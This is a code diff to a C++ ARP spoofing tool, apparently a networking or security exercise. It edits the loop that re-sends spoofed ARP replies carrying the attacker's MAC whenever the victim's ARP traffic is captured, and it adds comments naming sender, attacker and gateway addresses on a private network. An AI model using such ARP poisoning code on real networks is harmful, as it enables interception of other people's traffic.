@@ -151,6 +151,7 @@ int main(int argc, char* argv[]) {
 
 		// Arp spoof
 		while (true) {
+			printf("1");
 			int option = 0;
 			
 			// Trick periodically
@@ -166,16 +167,19 @@ int main(int argc, char* argv[]) {
 				continue;
 			}
 
-			//168.192.46.120
+			//sender = 192.168.254.26
+			//attacker = 192.168.254.168
+			//gateway = 192.168.254.74
 			EthArpPacket* receive_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
 
-			// printf("\n\nsip = %s\n\n", std::string(sender_packet->arp_.sip_).c_str());
-			// printf("\n\ntip = %s\n\n", std::string(sender_packet->arp_.tip_).c_str());
+			//printf("\n\narp_sip = %d | %d\n\n", htons(receive_packet->eth_.type_), htons(EthHdr::Arp));
+			// printf("\n\nsip = %s\n\n", std::string(receive_packet->arp_.sip_).c_str());
+			// printf("\n\ntip = %s\n\n", std::string(receive_packet->arp_.tip_).c_str());
 			// printf("\n\nIP = %s\n\n", std::string(Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))).c_str());
 			// printf("\n\nIP = %s\n\n", std::string(Ip(htons(Ip(target_ip)) | (htons(Ip(target_ip) >> 16) << 16))).c_str());
 
 
-			if (receive_packet->arp_.sip_ == Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))){//} && receive_packet->eth_.type_ == htons(EthHdr::Arp)) {
+			if (receive_packet->arp_.sip_ == Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))){//&& htons(receive_packet->eth_.type_) == htons(EthHdr::Arp)) {
 				// Trick periodically
 				send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
 				printf("capture - sender packet!!\n");
